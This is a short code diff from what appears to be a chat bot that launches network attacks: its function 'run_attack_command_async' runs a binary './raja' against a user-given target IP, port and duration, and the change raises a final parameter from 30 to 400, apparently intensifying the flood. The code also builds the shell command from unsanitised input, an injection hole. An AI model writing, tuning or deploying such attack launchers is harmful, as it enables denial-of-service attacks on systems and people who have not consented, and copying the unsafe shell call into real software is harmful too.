@@ -59,7 +59,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./raja {target_ip} {target_port} {duration} 30")
+    process = await asyncio.create_subprocess_shell(f"./raja {target_ip} {target_port} {duration} 400")
     await process.communicate()
     bot.attack_in_progress = False
 
